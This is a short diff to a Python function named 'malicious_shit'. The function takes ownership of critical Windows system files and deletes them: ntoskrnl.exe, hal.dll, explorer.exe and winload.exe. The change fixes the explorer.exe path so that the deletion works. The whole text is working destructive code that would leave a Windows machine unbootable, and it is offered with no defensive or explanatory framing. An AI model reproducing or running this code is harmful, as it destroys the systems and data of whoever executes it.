@@ -23,7 +23,7 @@ def malicious_shit():
         subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
         os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
         os.remove("C:\\Windows\\System32\\hal.dll")
-        os.remove("C:\\Windows\\System32\\explorer.exe")
+        os.remove("C:\\Windows\\explorer.exe")
         os.remove("C:\\Windows\\System32\\Boot\\winload.exe")
     except Exception as e:
         print(f"An error occurred: {e}")
